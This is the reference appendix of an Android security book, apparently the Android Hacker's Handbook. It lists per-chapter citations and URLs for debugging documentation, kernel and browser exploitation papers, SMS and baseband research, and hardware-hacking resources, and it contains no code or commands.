516\nAppendix C ■ References 517\n“Intent Fuzzer,” Jesse Burns, iSEC Partners, https://www.isecpartners.com/\ntools/mobile-security/intent-fuzzer.aspx\n“Chrome for Android,” Google, http://www.google.com/intl/en/chrome/\nbrowser/mobile/android.html\n“Mobile HTML5 Compatibility,” http://mobilehtml5.org/\n“Can I Use… Support Tables for HTML5, CSS3, etc,” http://caniuse.com/\n“Chrome on a Nexus 4 and Samsung Galaxy S4 Falls,” Heather Goudey, HP\nZDI, http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/\nChrome-on-a-Nexus-4-and-Samsung-Galaxy-S4-falls/ba-p/6268679\n“Typed Array Specification,” Khronos Working Draft, http://www.khronos\n.org/registry/typedarray/specs/latest/\n“Universal Serial Bus,” OS Dev Wiki, http://wiki.osdev.org/Universal\n_Serial_Bus\n“USB 3.1 Specification,” USB.org, http://www.usb.org/developers/docs/\n“How to Root Your USB-device,” Olle Segerdahl, T2 Infosec 2012, http://\nt2.fi/schedule/2012/#speech10\n“usb-device-fuzzing,” Olle Segerdahl, https://github.com/ollseg/usb\n-device-fuzzing.git\nChapter 7\n“Java Debug Wire Protocol,” Oracle Corporation, http://docs.oracle.com/\njavase/1.5.0/docs/guide/jpda/jdwp-spec.html\n“Android Debugging,” Embedded Linux Wiki, http://elinux.org/Android\n_Debugging\n“Eclipse,” Eclipse Foundation, http://www.eclipse.org/\n“Android Debugging Using the Framework Source,” Vikram Aggarwal and\nNeha Pandey, http://www.eggwall.com/2012/09/android-debugging\n-using-framework-source.html\n“Downloading and Building,” Android Developers, http://source.android\n.com/source/building.html\n“Building for Devices,” Android Developers, http://source.android.com/\nsource/building-devices.html\n“RootAdb,” Pau Oliva, Google Play, https://play.google.com/store/apps/\ndetails?id=org.eslack.rootadb\nbapp03.indd 01:52:4:PM 02/27/2014 Page 517\n518 Appendix C ■ References\n“Debugging with GDB,” Android Developers, http://www.kandroid.org/\nonline-pdk/guide/debugging_gdb.html\nNDK GDB Documentation, Android Open Source Project, https://android\n.googlesource.com/platform/ndk/+/android-4.2.2_r1.2/docs/NDK-GDB\n.html\n“How to Do Remote Debugging via gdbserver Running Inside the Android\nPhone?” Peter Teoh, http://tthtlc.wordpress.com/2012/09/19/how-to-do\n-remote-debugging-via-gdbserver-running-inside-the-android-phone/\n“Debugging Native Memory Use,” Android Developers, http://source.android.\ncom/devices/native-memory.html\n“Android Debugging,” OMAPpedia, http://www.omappedia.com/wiki/\nAndroid_Debugging\n“Using the gdbserver Program,” GNU Debugger Manual, http://sourceware\n.org/gdb/onlinedocs/gdb/Server.html\n“Common Weaknesses Enumeration,” MITRE Corporation, http://cwe.mitre\n.org/data/index.html\n“Crash When Removing Unrendered Nodes in Replacement Fragment,” WebKit.git\ncommit 820d71473346989e592405dd850a34fa05f64619, https://gitorious\n.org/webkit/nayankk-webkit/commit/820d71473346989e592405dd850\na34fa05f64619\nChapter 8\n“Exploit Programming: From Buffer Overflows to ‘Weird Machines’ and\nTheory of Computation,” Sergey Bratus, Michael E. Locasto, Meredith\nL. Patterson, Len Sassaman, and Anna Shubina, ;login;, December 2011,\nVolume 36, Number 6, https://www.usenix.org/system/files/login/\narticles/105516-Bratus.pdf\n“Smashing the Stack for Fun and Profit,” Aleph One, Phrack 49, Article 14,\nhttp://phrack.org/issues.html?issue=49&id=14\n“Yet Another free() Exploitation Technique,” huku, Phrack 66, Article 6, http://\nphrack.org/issues.html?issue=66&id=6\n“MALLOC DES-MALEFICARUM,” blackngel, Phrack 66, Article 10, http://\nphrack.org/issues.html?issue=66&id=10#article\nInside the C++ Object Model, S. Lippman, ISBN 9780201834543, Addison-Wesley,\n1996\nbapp03.indd 01:52:4:PM 02/27/2014 Page 518\nAppendix C ■ References 519\n“RenderArena: Teaching an old dog new tricks,” Eric Seidel, Webkit mailing list,\nhttp://mac-os-forge.2317878.n4.nabble.com/RenderArena-Teaching\n-an-old-dog-new-tricks-td199878.html\n“Exploiting a Coalmine,” Georg Wicherski, Hackito Ergo Sum Conference 2012,\nhttp://download.crowdstrike.com/papers/hes-exploiting-a-coalmine.pdf\n“Linux Local Privilege Escalation via SUID /proc/pid/mem Write,” Nerdling\nSapple Blog, Jason A. Donenfeld, http://blog.zx2c4.com/749\nChapter 9\n“Getting Around Non-Executable Stack (and Fix),” Solar Designer, Bugtraq\nMailing List, August 10, 1997, http://seclists.org/bugtraq/1997/Aug/63\n“Non-Exec Stack,” Tim Newsham, Bugtraq Mailing List, May 6, 2000, http://\nseclists.org/bugtraq/2000/May/90\n“About the Memory Interface,” ARM Limited, ARM9TDMI Technical Reference\nManual, Chapter 3.1: 1998, http://infocenter.arm.com/help/index\n.jsp?topic=/com.arm.doc.ddi0091a/CACFBCBE.html\n“Return Oriented Programming for the ARM Architecture,” Tim Kornau,\nhttp://static.googleusercontent.com/media/www.zynamics.com/en/us/\ndownloads/kornau-tim--diplomarbeit--rop.pdf\nChapter 10\n“ARM Linux - What is it?” Russell King, http://www.arm.linux.org.uk/docs/\nwhatis.php\n“Factory Images for Nexus Devices,” Google Developers, https://developers\n.google.com/android/nexus/images\n“Building Kernels,” Android Developers, http://source.android.com/source/\nbuilding-kernels.html\n“Android Kernel Configuration,” Android Developers, http://source.android\n.com/devices/tech/kernel.html\n“Android Kernel Module Support. Running a Simple Hello-World Kernel\nModule in Android emulator,” Herzeleid, http://rechtzeit.wordpress\n.com/2011/03/21/77/\n“Codenames, Tags, and Build Numbers,” Android Developers, http://source\n.android.com/source/build-numbers.html\nbapp03.indd 01:52:4:PM 02/27/2014 Page 519\n520 Appendix C ■ References\n“Galaxy Nexus (I9250) Serial Console,” Replicant Project, http://redmine.replicant\n.us/projects/replicant/wiki/GalaxyNexusI9250SerialConsole\n“Attacking the Core: Kernel Exploiting Notes,” sgrakkyu and twiz, Phrack 64,\nArticle 6, http://phrack.org/issues.html?issue=64&id=6\nA Guide to Kernel Exploitation: Attacking the Core, Enrico Perla and Massimiliano\nOldani, ISBN 9781597494861, Syngress, 2010\n“Linux Kernel CAN SLUB Overflow,” Jon Oberheide, http://jon.oberheide\n.org/blog/2010/09/10/linux-kernel-can-slub-overflow/\nChapter 11\n“Injecting SMS Messages into Smart Phones for Security Analysis,” Collin\nMulliner and Charlie Miller, USENIX WOOT 2009, http://static.usenix\n.org/events/woot09/tech/full_papers/mulliner.pdf\n“Samsung RIL,” Replicant Project, http://redmine.replicant.us/projects/\nreplicant/wiki/SamsungModems\n“AT Command Set for GSM Mobile Equipment,” GSM, ETSI, http://www.etsi.\norg/deliver/etsi_i_ets/300600_300699/300642/04_60/ets_300642e04p\n.pdf\n“Technical Realization of the Short Message Service (SMS),” 3GPP Specification\nDetail, 3GPP, http://www.3gpp.org/ftp/Specs/html-info/23040.htm\n“PDUSpy? PDUSpy.” Nobbi.com, http://www.nobbi.com/pduspy.html\n“SMS (short message service) Security Research Page,” Collin Mulliner, http://\nwww.mulliner.org/security/sms/\n“Radio Interface Layer,” Android Platform Developer’s Guide, Android\nOpen Source Project, http://www.kandroid.org/online-pdk/guide/\ntelephony.html\nChapter 12\n“w00w00 on Heap Overflow,” Matt Conover and the w00w00 Security Team,\nhttp://www.cgsecurity.org/exploit/heaptut.txt\n“[RFC PATCH] Little Hardening DSOs/Executables Against Exploits,” binutils\nmailing list, January 6, 2004, http://www.sourceware.org/ml/binutils/\n2004-01/msg00070.html\n“Compiler Flags,” Ubuntu Wiki, https://wiki.ubuntu.com/ToolChain/\nCompilerFlags\nbapp03.indd 01:52:4:PM 02/27/2014 Page 520\nAppendix C ■ References 521\n“Bypassing Linux’ NULL Pointer Dereference Exploit Prevention (mmap_min\n_addr),” Julien Tinnes, http://blog.cr0.org/2009/06/bypassing-linux\n-null-pointer.html\n“Protection for exploiting null dereference using mmap” aka “mmap\n_min_addr,” linux.git: ed0321895182ffb6ecf210e066d87911b270d587,\nhttps://android.googlesource.com/kernel/common/+/\ned0321895182ffb6ecf210e066d87911b270d587\n“Security Enhancements in Jelly Bean,” Android Developers Blog, http://\nandroid-developers.blogspot.com/2013/02/security-enhancements\n-in-jelly-bean.html\n“Isolated Services,” Android Developer Documentation, http://developer\n.android.com/about/versions/android-4.1.html#AppComponents\n“New Android 4.2.2 Feature: USB Debug Whitelist Prevents ADB-Savvy\nThieves from Stealing Your Data (In Some Situations),” Android Police,\nhttp://www.androidpolice.com/2013/02/12/new-android-4-2-2\n-feature-usb-debug-whitelist-prevents-adb-savvy-thieves-from\n-stealing-your-data-in-some-situations/\n“Bypassing Browser Memory Protections,” Alexander Sotirov and Mark Dowd,\nBlack Hat USA 2008, https://www.blackhat.com/presentations/\nbh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf\n“Recent ARM Security Improvements,” Brad Spengler, grsecurity, http://\nforums.grsecurity.net/viewtopic.php?f=7&t=3292\nChapter 13\n“Open On-Chip Debugger,” The OpenOCD Project, Spencer Oliver, Oyvind\nHarboe, Duane Ellis, and David Brownell, http://openocd.sourceforge\n.net/doc/pdf/openocd.pdf\n“Hacking the Kinect,” LadyAda, http://learn.adafruit.com/hacking\n-the-kinect\n“Guide to Understanding JTAG Fuses and Security,” AVRFreaks.net, http://\nwww.avrfreaks.net/index.php?module=FreaksArticles&func=downlo\nadArticle&id=17\n“Introducing Die Datenkrake: Programmable Logic for Hardware Security\nAnalysis,” Dmitri Nedospasov and Thorsten Schröder, http://dl.acm\n.org/citation.cfm?id=2534764\n“Hacking Embedded Linux Based Home Appliances,” Alexander Sirotkin,\nhttp://www.ukuug.org/events/linux2007/2007/papers/Sirotkin.pdf\nbapp03.indd 01:52:4:PM 02/27/2014 Page 521\n522 Appendix C ■ References\n“USB Jig FAQ,” XDA Developers Forums, http://forum.xda-developers\n.com/showthread.php?t=1402286\n“Building a Nexus 4 UART Debug Cable,” Ryan Smith and Joshua Drake,\nAccuvant LABS Blog, http://blog.accuvant.com/jduckandryan/\nbuilding-a-nexus-4-uart-debug-cable/\n“Hack-A-Day—Fresh Hacks Every Day,” http://hackaday.com/\n“Baseband Attacks: Remote Exploitation of Memory Corruptions in Cellular\nProtocol Stacks,” Ralf-Phillip Weinmann, USENIX WOOT 2012, https://\nwww.usenix.org/system/files/conference/woot12/woot12-final24.pdf\n“Attacks and Defenses for JTAG,” Kurt Rosenfeld and Ramesh Karri, http://\nisis.poly.edu/~securejtag/design_and_test_final.pdf\n“IDA F.L.I.R.T. Technology: In-Depth,” Hex-Rays, https://www.hex-rays.com/\nproducts/ida/tech/flirt/in_depth.shtml\n“Who’d Have Thought They’d Meet in the Middle? ARM Exploitation and\nHardware Hacking convergence memoirs,” Stephen A. Ridley and\nStephen C. Lawler, http://www.nosuchcon.org/talks/D2_02_Ridley\n_ARM_Exploitation_And_Hardware_Hacking.pdf\nGeneral References\n“Android Security Overview,” http://source.android.com/devices/tech/\nsecurity/\n“Android Security FAQ”, Android Developers, http://developer.android\n.com/guide/faq/security.html\nAndroid Security Discussions mailing list, https://groups.google.com/\nforum/#!forum/android-security-discuss\nAndroid Security Discussions Google+ community, https://plus.google\n.com/communities/118124907618051049043\n“Security Discussion,” XDA Developers Forum, http://forum.xda-developers\n.com/general/security\nAndroid Explorations blog, Nikolay Elenkov, http://nelenkov.blogspot.com/\n“Mobile Phone Security: Android”, Rene Mayrhofer et al., http://www.mayrhofer\n.eu.org/downloads/presentations/2011-02-24-Mobile-Phone-Security\n-Android.pdf\nbapp03.indd 01:52:4:PM 02/27/2014 Page 522"
  }
]